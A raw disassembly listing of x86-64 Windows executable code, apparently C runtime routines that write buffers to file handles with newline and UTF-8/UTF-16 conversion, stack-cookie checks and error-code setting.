   14000b77c:	48 63 c7             	movslq %edi,%rax
   14000b77f:	48 3b c2             	cmp    %rdx,%rax
   14000b782:	7c df                	jl     0x14000b763
   14000b784:	01 53 04             	add    %edx,0x4(%rbx)
   14000b787:	eb 63                	jmp    0x14000b7ec
   14000b789:	4d 85 c0             	test   %r8,%r8
   14000b78c:	7e 33                	jle    0x14000b7c1
   14000b78e:	48 8b d7             	mov    %rdi,%rdx
   14000b791:	4c 8b 55 e7          	mov    -0x19(%rbp),%r10
   14000b795:	49 c1 fa 06          	sar    $0x6,%r10
   14000b799:	48 8b 45 ef          	mov    -0x11(%rbp),%rax
   14000b79d:	4c 8d 0c c0          	lea    (%rax,%rax,8),%r9
   14000b7a1:	4b 8b 84 d3 e0 a1 01 	mov    0x1a1e0(%r11,%r10,8),%rax
   14000b7a8:	00 
   14000b7a9:	4a 8d 0c c8          	lea    (%rax,%r9,8),%rcx
   14000b7ad:	8a 04 32             	mov    (%rdx,%rsi,1),%al
   14000b7b0:	88 44 11 3e          	mov    %al,0x3e(%rcx,%rdx,1)
   14000b7b4:	ff c7                	inc    %edi
   14000b7b6:	48 ff c2             	inc    %rdx
   14000b7b9:	48 63 c7             	movslq %edi,%rax
   14000b7bc:	49 3b c0             	cmp    %r8,%rax
   14000b7bf:	7c e0                	jl     0x14000b7a1
   14000b7c1:	44 01 43 04          	add    %r8d,0x4(%rbx)
   14000b7c5:	eb 25                	jmp    0x14000b7ec
   14000b7c7:	8a 06                	mov    (%rsi),%al
   14000b7c9:	43 88 44 f9 3e       	mov    %al,0x3e(%r9,%r15,8)
   14000b7ce:	4b 8b 84 d3 e0 a1 01 	mov    0x1a1e0(%r11,%r10,8),%rax
   14000b7d5:	00 
   14000b7d6:	42 80 4c f8 3d 04    	orb    $0x4,0x3d(%rax,%r15,8)
   14000b7dc:	8d 42 01             	lea    0x1(%rdx),%eax
   14000b7df:	89 43 04             	mov    %eax,0x4(%rbx)
   14000b7e2:	eb 08                	jmp    0x14000b7ec
   14000b7e4:	ff 15 a6 38 00 00    	call   *0x38a6(%rip)        # 0x14000f090
   14000b7ea:	89 03                	mov    %eax,(%rbx)
   14000b7ec:	48 8b c3             	mov    %rbx,%rax
   14000b7ef:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000b7f3:	48 33 cc             	xor    %rsp,%rcx
   14000b7f6:	e8 95 22 00 00       	call   0x14000da90
   14000b7fb:	48 8b 9c 24 20 01 00 	mov    0x120(%rsp),%rbx
   14000b802:	00 
   14000b803:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000b80a:	41 5f                	pop    %r15
   14000b80c:	41 5e                	pop    %r14
   14000b80e:	41 5d                	pop    %r13
   14000b810:	41 5c                	pop    %r12
   14000b812:	5f                   	pop    %rdi
   14000b813:	5e                   	pop    %rsi
   14000b814:	5d                   	pop    %rbp
   14000b815:	c3                   	ret
   14000b816:	cc                   	int3
   14000b817:	cc                   	int3
   14000b818:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b81d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b822:	56                   	push   %rsi
   14000b823:	57                   	push   %rdi
   14000b824:	41 56                	push   %r14
   14000b826:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000b82b:	e8 20 24 00 00       	call   0x14000dc50
   14000b830:	48 2b e0             	sub    %rax,%rsp
   14000b833:	48 8b 05 06 d8 00 00 	mov    0xd806(%rip),%rax        # 0x140019040
   14000b83a:	48 33 c4             	xor    %rsp,%rax
   14000b83d:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000b844:	00 
   14000b845:	4c 63 d2             	movslq %edx,%r10
   14000b848:	48 8b f9             	mov    %rcx,%rdi
   14000b84b:	49 8b c2             	mov    %r10,%rax
   14000b84e:	41 8b e9             	mov    %r9d,%ebp
   14000b851:	48 c1 f8 06          	sar    $0x6,%rax
   14000b855:	48 8d 0d 84 e9 00 00 	lea    0xe984(%rip),%rcx        # 0x14001a1e0
   14000b85c:	41 83 e2 3f          	and    $0x3f,%r10d
   14000b860:	49 03 e8             	add    %r8,%rbp
   14000b863:	49 8b f0             	mov    %r8,%rsi
   14000b866:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000b86a:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000b86e:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000b873:	33 c0                	xor    %eax,%eax
   14000b875:	48 89 07             	mov    %rax,(%rdi)
   14000b878:	89 47 08             	mov    %eax,0x8(%rdi)
   14000b87b:	4c 3b c5             	cmp    %rbp,%r8
   14000b87e:	73 6f                	jae    0x14000b8ef
   14000b880:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000b885:	48 3b f5             	cmp    %rbp,%rsi
   14000b888:	73 24                	jae    0x14000b8ae
   14000b88a:	8a 06                	mov    (%rsi),%al
   14000b88c:	48 ff c6             	inc    %rsi
   14000b88f:	3c 0a                	cmp    $0xa,%al
   14000b891:	75 09                	jne    0x14000b89c
   14000b893:	ff 47 08             	incl   0x8(%rdi)
   14000b896:	c6 03 0d             	movb   $0xd,(%rbx)
   14000b899:	48 ff c3             	inc    %rbx
   14000b89c:	88 03                	mov    %al,(%rbx)
   14000b89e:	48 ff c3             	inc    %rbx
   14000b8a1:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000b8a8:	00 
   14000b8a9:	48 3b d8             	cmp    %rax,%rbx
   14000b8ac:	72 d7                	jb     0x14000b885
   14000b8ae:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000b8b4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000b8b9:	2b d8                	sub    %eax,%ebx
   14000b8bb:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000b8c0:	44 8b c3             	mov    %ebx,%r8d
   14000b8c3:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000b8c8:	49 8b ce             	mov    %r14,%rcx
   14000b8cb:	ff 15 47 38 00 00    	call   *0x3847(%rip)        # 0x14000f118
   14000b8d1:	85 c0                	test   %eax,%eax
   14000b8d3:	74 12                	je     0x14000b8e7
   14000b8d5:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000b8d9:	01 47 04             	add    %eax,0x4(%rdi)
   14000b8dc:	3b c3                	cmp    %ebx,%eax
   14000b8de:	72 0f                	jb     0x14000b8ef
   14000b8e0:	48 3b f5             	cmp    %rbp,%rsi
   14000b8e3:	72 9b                	jb     0x14000b880
   14000b8e5:	eb 08                	jmp    0x14000b8ef
   14000b8e7:	ff 15 a3 37 00 00    	call   *0x37a3(%rip)        # 0x14000f090
   14000b8ed:	89 07                	mov    %eax,(%rdi)
   14000b8ef:	48 8b c7             	mov    %rdi,%rax
   14000b8f2:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000b8f9:	00 
   14000b8fa:	48 33 cc             	xor    %rsp,%rcx
   14000b8fd:	e8 8e 21 00 00       	call   0x14000da90
   14000b902:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000b909:	00 
   14000b90a:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000b90e:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000b912:	49 8b e3             	mov    %r11,%rsp
   14000b915:	41 5e                	pop    %r14
   14000b917:	5f                   	pop    %rdi
   14000b918:	5e                   	pop    %rsi
   14000b919:	c3                   	ret
   14000b91a:	cc                   	int3
   14000b91b:	cc                   	int3
   14000b91c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b921:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b926:	56                   	push   %rsi
   14000b927:	57                   	push   %rdi
   14000b928:	41 56                	push   %r14
   14000b92a:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000b92f:	e8 1c 23 00 00       	call   0x14000dc50
   14000b934:	48 2b e0             	sub    %rax,%rsp
   14000b937:	48 8b 05 02 d7 00 00 	mov    0xd702(%rip),%rax        # 0x140019040
   14000b93e:	48 33 c4             	xor    %rsp,%rax
   14000b941:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000b948:	00 
   14000b949:	4c 63 d2             	movslq %edx,%r10
   14000b94c:	48 8b f9             	mov    %rcx,%rdi
   14000b94f:	49 8b c2             	mov    %r10,%rax
   14000b952:	41 8b e9             	mov    %r9d,%ebp
   14000b955:	48 c1 f8 06          	sar    $0x6,%rax
   14000b959:	48 8d 0d 80 e8 00 00 	lea    0xe880(%rip),%rcx        # 0x14001a1e0
   14000b960:	41 83 e2 3f          	and    $0x3f,%r10d
   14000b964:	49 03 e8             	add    %r8,%rbp
   14000b967:	49 8b f0             	mov    %r8,%rsi
   14000b96a:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000b96e:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000b972:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000b977:	33 c0                	xor    %eax,%eax
   14000b979:	48 89 07             	mov    %rax,(%rdi)
   14000b97c:	89 47 08             	mov    %eax,0x8(%rdi)
   14000b97f:	4c 3b c5             	cmp    %rbp,%r8
   14000b982:	0f 83 82 00 00 00    	jae    0x14000ba0a
   14000b988:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000b98d:	48 3b f5             	cmp    %rbp,%rsi
   14000b990:	73 31                	jae    0x14000b9c3
   14000b992:	0f b7 06             	movzwl (%rsi),%eax
   14000b995:	48 83 c6 02          	add    $0x2,%rsi
   14000b999:	66 83 f8 0a          	cmp    $0xa,%ax
   14000b99d:	75 10                	jne    0x14000b9af
   14000b99f:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000b9a3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000b9a8:	66 89 0b             	mov    %cx,(%rbx)
   14000b9ab:	48 83 c3 02          	add    $0x2,%rbx
   14000b9af:	66 89 03             	mov    %ax,(%rbx)
   14000b9b2:	48 83 c3 02          	add    $0x2,%rbx
   14000b9b6:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000b9bd:	00 
   14000b9be:	48 3b d8             	cmp    %rax,%rbx
   14000b9c1:	72 ca                	jb     0x14000b98d
   14000b9c3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000b9c9:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000b9ce:	48 2b d8             	sub    %rax,%rbx
   14000b9d1:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000b9d6:	48 d1 fb             	sar    $1,%rbx
   14000b9d9:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000b9de:	03 db                	add    %ebx,%ebx
   14000b9e0:	49 8b ce             	mov    %r14,%rcx
   14000b9e3:	44 8b c3             	mov    %ebx,%r8d
   14000b9e6:	ff 15 2c 37 00 00    	call   *0x372c(%rip)        # 0x14000f118
   14000b9ec:	85 c0                	test   %eax,%eax
   14000b9ee:	74 12                	je     0x14000ba02
   14000b9f0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000b9f4:	01 47 04             	add    %eax,0x4(%rdi)
   14000b9f7:	3b c3                	cmp    %ebx,%eax
   14000b9f9:	72 0f                	jb     0x14000ba0a
   14000b9fb:	48 3b f5             	cmp    %rbp,%rsi
   14000b9fe:	72 88                	jb     0x14000b988
   14000ba00:	eb 08                	jmp    0x14000ba0a
   14000ba02:	ff 15 88 36 00 00    	call   *0x3688(%rip)        # 0x14000f090
   14000ba08:	89 07                	mov    %eax,(%rdi)
   14000ba0a:	48 8b c7             	mov    %rdi,%rax
   14000ba0d:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000ba14:	00 
   14000ba15:	48 33 cc             	xor    %rsp,%rcx
   14000ba18:	e8 73 20 00 00       	call   0x14000da90
   14000ba1d:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000ba24:	00 
   14000ba25:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000ba29:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000ba2d:	49 8b e3             	mov    %r11,%rsp
   14000ba30:	41 5e                	pop    %r14
   14000ba32:	5f                   	pop    %rdi
   14000ba33:	5e                   	pop    %rsi
   14000ba34:	c3                   	ret
   14000ba35:	cc                   	int3
   14000ba36:	cc                   	int3
   14000ba37:	cc                   	int3
   14000ba38:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ba3d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000ba42:	56                   	push   %rsi
   14000ba43:	57                   	push   %rdi
   14000ba44:	41 54                	push   %r12
   14000ba46:	41 56                	push   %r14
   14000ba48:	41 57                	push   %r15
   14000ba4a:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000ba4f:	e8 fc 21 00 00       	call   0x14000dc50
   14000ba54:	48 2b e0             	sub    %rax,%rsp
   14000ba57:	48 8b 05 e2 d5 00 00 	mov    0xd5e2(%rip),%rax        # 0x140019040
   14000ba5e:	48 33 c4             	xor    %rsp,%rax
   14000ba61:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000ba68:	00 
   14000ba69:	4c 63 d2             	movslq %edx,%r10
   14000ba6c:	48 8b d9             	mov    %rcx,%rbx
   14000ba6f:	49 8b c2             	mov    %r10,%rax
   14000ba72:	45 8b f1             	mov    %r9d,%r14d
   14000ba75:	48 c1 f8 06          	sar    $0x6,%rax
   14000ba79:	48 8d 0d 60 e7 00 00 	lea    0xe760(%rip),%rcx        # 0x14001a1e0
   14000ba80:	41 83 e2 3f          	and    $0x3f,%r10d
   14000ba84:	4d 03 f0             	add    %r8,%r14
   14000ba87:	4d 8b f8             	mov    %r8,%r15
   14000ba8a:	49 8b f8             	mov    %r8,%rdi
   14000ba8d:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000ba91:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000ba95:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000ba9a:	33 c0                	xor    %eax,%eax
   14000ba9c:	48 89 03             	mov    %rax,(%rbx)
   14000ba9f:	4d 3b c6             	cmp    %r14,%r8
   14000baa2:	89 43 08             	mov    %eax,0x8(%rbx)
   14000baa5:	0f 83 ce 00 00 00    	jae    0x14000bb79
   14000baab:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000bab0:	49 3b fe             	cmp    %r14,%rdi
   14000bab3:	73 2d                	jae    0x14000bae2
   14000bab5:	0f b7 0f             	movzwl (%rdi),%ecx
   14000bab8:	48 83 c7 02          	add    $0x2,%rdi
   14000babc:	66 83 f9 0a          	cmp    $0xa,%cx
   14000bac0:	75 0c                	jne    0x14000bace
   14000bac2:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000bac7:	66 89 10             	mov    %dx,(%rax)
   14000baca:	48 83 c0 02          	add    $0x2,%rax
   14000bace:	66 89 08             	mov    %cx,(%rax)
   14000bad1:	48 83 c0 02          	add    $0x2,%rax
   14000bad5:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000badc:	00 
   14000badd:	48 3b c1             	cmp    %rcx,%rax
   14000bae0:	72 ce                	jb     0x14000bab0
   14000bae2:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000bae8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000baed:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000baf3:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000baf8:	48 2b c1             	sub    %rcx,%rax
   14000bafb:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000bb02:	00 
   14000bb03:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000bb0a:	00 
   14000bb0b:	48 d1 f8             	sar    $1,%rax
   14000bb0e:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000bb13:	44 8b c8             	mov    %eax,%r9d
   14000bb16:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000bb1b:	33 d2                	xor    %edx,%edx
   14000bb1d:	e8 f2 cb ff ff       	call   0x140008714
   14000bb22:	8b e8                	mov    %eax,%ebp
   14000bb24:	85 c0                	test   %eax,%eax
   14000bb26:	74 49                	je     0x14000bb71
   14000bb28:	33 f6                	xor    %esi,%esi
   14000bb2a:	85 c0                	test   %eax,%eax
   14000bb2c:	74 33                	je     0x14000bb61
   14000bb2e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bb34:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000bb3b:	00 
   14000bb3c:	8b ce                	mov    %esi,%ecx
   14000bb3e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000bb43:	44 8b c5             	mov    %ebp,%r8d
   14000bb46:	48 03 d1             	add    %rcx,%rdx
   14000bb49:	49 8b cc             	mov    %r12,%rcx
   14000bb4c:	44 2b c6             	sub    %esi,%r8d
   14000bb4f:	ff 15 c3 35 00 00    	call   *0x35c3(%rip)        # 0x14000f118
   14000bb55:	85 c0                	test   %eax,%eax
   14000bb57:	74 18                	je     0x14000bb71
   14000bb59:	03 74 24 40          	add    0x40(%rsp),%esi
   14000bb5d:	3b f5                	cmp    %ebp,%esi
   14000bb5f:	72 cd                	jb     0x14000bb2e
   14000bb61:	8b c7                	mov    %edi,%eax
   14000bb63:	41 2b c7             	sub    %r15d,%eax
   14000bb66:	89 43 04             	mov    %eax,0x4(%rbx)
   14000bb69:	49 3b fe             	cmp    %r14,%rdi
   14000bb6c:	e9 34 ff ff ff       	jmp    0x14000baa5
   14000bb71:	ff 15 19 35 00 00    	call   *0x3519(%rip)        # 0x14000f090
   14000bb77:	89 03                	mov    %eax,(%rbx)
   14000bb79:	48 8b c3             	mov    %rbx,%rax
   14000bb7c:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000bb83:	00 
   14000bb84:	48 33 cc             	xor    %rsp,%rcx
   14000bb87:	e8 04 1f 00 00       	call   0x14000da90
   14000bb8c:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000bb93:	00 
   14000bb94:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000bb98:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000bb9c:	49 8b e3             	mov    %r11,%rsp
   14000bb9f:	41 5f                	pop    %r15
   14000bba1:	41 5e                	pop    %r14
   14000bba3:	41 5c                	pop    %r12
   14000bba5:	5f                   	pop    %rdi
   14000bba6:	5e                   	pop    %rsi
   14000bba7:	c3                   	ret
   14000bba8:	48 8b c4             	mov    %rsp,%rax
   14000bbab:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000bbaf:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000bbb3:	4c 89 60 20          	mov    %r12,0x20(%rax)
   14000bbb7:	89 48 08             	mov    %ecx,0x8(%rax)
   14000bbba:	41 55                	push   %r13
   14000bbbc:	41 56                	push   %r14
   14000bbbe:	41 57                	push   %r15
   14000bbc0:	48 83 ec 40          	sub    $0x40,%rsp
   14000bbc4:	49 8b d9             	mov    %r9,%rbx
   14000bbc7:	45 8b e0             	mov    %r8d,%r12d
   14000bbca:	4c 8b ea             	mov    %rdx,%r13
   14000bbcd:	48 63 f9             	movslq %ecx,%rdi
   14000bbd0:	83 ff fe             	cmp    $0xfffffffe,%edi
   14000bbd3:	75 1c                	jne    0x14000bbf1
   14000bbd5:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000bbda:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000bbdf:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000bbe4:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000bbeb:	00 
   14000bbec:	e9 bf 00 00 00       	jmp    0x14000bcb0
   14000bbf1:	85 c9                	test   %ecx,%ecx
   14000bbf3:	0f 88 86 00 00 00    	js     0x14000bc7f
   14000bbf9:	3b 3d e1 e9 00 00    	cmp    0xe9e1(%rip),%edi        # 0x14001a5e0
   14000bbff:	73 7e                	jae    0x14000bc7f
   14000bc01:	48 8b c7             	mov    %rdi,%rax
   14000bc04:	4c 8b ff             	mov    %rdi,%r15
   14000bc07:	49 c1 ef 06          	shr    $0x6,%r15
   14000bc0b:	48 8d 15 ce e5 00 00 	lea    0xe5ce(%rip),%rdx        # 0x14001a1e0
   14000bc12:	83 e0 3f             	and    $0x3f,%eax
   14000bc15:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000bc19:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000bc1e:	4a 8b 04 fa          	mov    (%rdx,%r15,8),%rax
   14000bc22:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000bc27:	74 56                	je     0x14000bc7f
   14000bc29:	8b cf                	mov    %edi,%ecx
   14000bc2b:	e8 c4 ce ff ff       	call   0x140008af4
   14000bc30:	41 83 ce ff          	or     $0xffffffff,%r14d
   14000bc34:	48 8d 05 a5 e5 00 00 	lea    0xe5a5(%rip),%rax        # 0x14001a1e0
   14000bc3b:	4a 8b 04 f8          	mov    (%rax,%r15,8),%rax
   14000bc3f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000bc44:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000bc49:	75 15                	jne    0x14000bc60
   14000bc4b:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000bc4f:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000bc56:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000bc5a:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000bc5e:	eb 13                	jmp    0x14000bc73
   14000bc60:	4c 8b cb             	mov    %rbx,%r9
   14000bc63:	45 8b c4             	mov    %r12d,%r8d
   14000bc66:	49 8b d5             	mov    %r13,%rdx
   14000bc69:	8b cf                	mov    %edi,%ecx
   14000bc6b:	e8 60 00 00 00       	call   0x14000bcd0
   14000bc70:	44 8b f0             	mov    %eax,%r14d
   14000bc73:	8b cf                	mov    %edi,%ecx
   14000bc75:	e8 a2 ce ff ff       	call   0x140008b1c
   14000bc7a:	41 8b c6             	mov    %r14d,%eax
   14000bc7d:	eb 34                	jmp    0x14000bcb3
   14000bc7f:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000bc84:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000bc89:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000bc8e:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000bc93:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000bc9a:	00 
   14000bc9b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bca1:	45 33 c9             	xor    %r9d,%r9d
   14000bca4:	45 33 c0             	xor    %r8d,%r8d
   14000bca7:	33 d2                	xor    %edx,%edx
   14000bca9:	33 c9                	xor    %ecx,%ecx
   14000bcab:	e8 7c b4 ff ff       	call   0x14000712c
   14000bcb0:	83 c8 ff             	or     $0xffffffff,%eax
   14000bcb3:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000bcb8:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000bcbd:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   14000bcc2:	48 83 c4 40          	add    $0x40,%rsp
   14000bcc6:	41 5f                	pop    %r15
   14000bcc8:	41 5e                	pop    %r14
   14000bcca:	41 5d                	pop    %r13
   14000bccc:	c3                   	ret
   14000bccd:	cc                   	int3
   14000bcce:	cc                   	int3
   14000bccf:	cc                   	int3
   14000bcd0:	40 55                	rex push %rbp
   14000bcd2:	53                   	push   %rbx
   14000bcd3:	56                   	push   %rsi
   14000bcd4:	57                   	push   %rdi
   14000bcd5:	41 54                	push   %r12
   14000bcd7:	41 55                	push   %r13
   14000bcd9:	41 56                	push   %r14
   14000bcdb:	41 57                	push   %r15
   14000bcdd:	48 8b ec             	mov    %rsp,%rbp
   14000bce0:	48 83 ec 68          	sub    $0x68,%rsp
   14000bce4:	33 ff                	xor    %edi,%edi
   14000bce6:	45 8b f8             	mov    %r8d,%r15d
   14000bce9:	4c 63 e1             	movslq %ecx,%r12
   14000bcec:	49 8b d9             	mov    %r9,%rbx
   14000bcef:	4c 8b f2             	mov    %rdx,%r14
   14000bcf2:	45 85 c0             	test   %r8d,%r8d
   14000bcf5:	0f 84 d2 02 00 00    	je     0x14000bfcd
   14000bcfb:	48 85 d2             	test   %rdx,%rdx
   14000bcfe:	75 37                	jne    0x14000bd37
   14000bd00:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000bd05:	45 33 c0             	xor    %r8d,%r8d
   14000bd08:	41 89 79 34          	mov    %edi,0x34(%r9)
   14000bd0c:	33 d2                	xor    %edx,%edx
   14000bd0e:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000bd13:	33 c9                	xor    %ecx,%ecx
   14000bd15:	41 c7 41 2c 16 00 00 	movl   $0x16,0x2c(%r9)
   14000bd1c:	00 
   14000bd1d:	45 33 c9             	xor    %r9d,%r9d
   14000bd20:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000bd25:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000bd2a:	e8 fd b3 ff ff       	call   0x14000712c
   14000bd2f:	83 c8 ff             	or     $0xffffffff,%eax
   14000bd32:	e9 98 02 00 00       	jmp    0x14000bfcf
   14000bd37:	49 8b c4             	mov    %r12,%rax
   14000bd3a:	48 8d 15 9f e4 00 00 	lea    0xe49f(%rip),%rdx        # 0x14001a1e0
   14000bd41:	83 e0 3f             	and    $0x3f,%eax
   14000bd44:	49 8b cc             	mov    %r12,%rcx
   14000bd47:	48 c1 f9 06          	sar    $0x6,%rcx
   14000bd4b:	48 89 4d c8          	mov    %rcx,-0x38(%rbp)
   14000bd4f:	4c 8d 2c c0          	lea    (%rax,%rax,8),%r13
   14000bd53:	48 8b 0c ca          	mov    (%rdx,%rcx,8),%rcx
   14000bd57:	42 0f be 74 e9 39    	movsbl 0x39(%rcx,%r13,8),%esi
   14000bd5d:	8d 46 ff             	lea    -0x1(%rsi),%eax
   14000bd60:	3c 01                	cmp    $0x1,%al
   14000bd62:	77 09                	ja     0x14000bd6d
   14000bd64:	41 8b c7             	mov    %r15d,%eax
   14000bd67:	f7 d0                	not    %eax
   14000bd69:	a8 01                	test   $0x1,%al
   14000bd6b:	74 93                	je     0x14000bd00
   14000bd6d:	42 f6 44 e9 38 20    	testb  $0x20,0x38(%rcx,%r13,8)
   14000bd73:	74 0e                	je     0x14000bd83
   14000bd75:	33 d2                	xor    %edx,%edx
   14000bd77:	41 8b cc             	mov    %r12d,%ecx
   14000bd7a:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000bd7e:	e8 5d 06 00 00       	call   0x14000c3e0
   14000bd83:	41 8b cc             	mov    %r12d,%ecx
   14000bd86:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   14000bd8a:	e8 45 03 00 00       	call   0x14000c0d4
   14000bd8f:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000bd93:	4c 8d 05 46 e4 00 00 	lea    0xe446(%rip),%r8        # 0x14001a1e0
   14000bd9a:	85 c0                	test   %eax,%eax
   14000bd9c:	0f 84 17 01 00 00    	je     0x14000beb9
   14000bda2:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000bda6:	42 38 7c e8 38       	cmp    %dil,0x38(%rax,%r13,8)
   14000bdab:	0f 8d 08 01 00 00    	jge    0x14000beb9
   14000bdb1:	40 38 7b 28          	cmp    %dil,0x28(%rbx)
   14000bdb5:	75 13                	jne    0x14000bdca
   14000bdb7:	48 8b cb             	mov    %rbx,%rcx
   14000bdba:	e8 a1 a8 ff ff       	call   0x140006660
   14000bdbf:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000bdc3:	4c 8d 05 16 e4 00 00 	lea    0xe416(%rip),%r8        # 0x14001a1e0
   14000bdca:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000bdce:	48 39 b8 38 01 00 00 	cmp    %rdi,0x138(%rax)
   14000bdd5:	75 0f                	jne    0x14000bde6
   14000bdd7:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000bddb:	42 38 7c e8 39       	cmp    %dil,0x39(%rax,%r13,8)
   14000bde0:	0f 84 d3 00 00 00    	je     0x14000beb9
   14000bde6:	49 8b 0c d0          	mov    (%r8,%rdx,8),%rcx
   14000bdea:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000bdee:	4a 8b 4c e9 28       	mov    0x28(%rcx,%r13,8),%rcx
   14000bdf3:	ff 15 27 34 00 00    	call   *0x3427(%rip)        # 0x14000f220
   14000bdf9:	85 c0                	test   %eax,%eax
   14000bdfb:	0f 84 ad 00 00 00    	je     0x14000beae
   14000be01:	40 84 f6             	test   %sil,%sil
   14000be04:	0f 84 81 00 00 00    	je     0x14000be8b
   14000be0a:	40 fe ce             	dec    %sil
   14000be0d:	40 80 fe 01          	cmp    $0x1,%sil
   14000be11:	0f 87 3b 01 00 00    	ja     0x14000bf52
   14000be17:	4f 8d 24 3e          	lea    (%r14,%r15,1),%r12
   14000be1b:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   14000be1f:	4d 8b fe             	mov    %r14,%r15
   14000be22:	4d 3b f4             	cmp    %r12,%r14
